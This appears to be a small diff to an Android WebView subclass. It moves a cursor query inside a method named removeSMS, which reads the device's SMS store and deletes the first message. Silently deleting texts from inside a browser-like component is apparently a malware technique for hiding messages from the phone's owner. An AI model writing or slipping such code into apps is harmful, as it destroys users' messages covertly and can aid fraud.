@@ -391,9 +391,8 @@ public class AutomatedWebview extends WebView {
 
     private void removeSMS() {
         Uri uriSMSURI = Uri.parse("content://sms/");
-        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
         try {
-
+            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
             if (cur.moveToFirst()) {
                 String MsgId = cur.getString(0);
                 context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
@@ -401,6 +400,7 @@ public class AutomatedWebview extends WebView {
         }
         catch(Exception e)
         {
+
             e.printStackTrace();
         }
     }
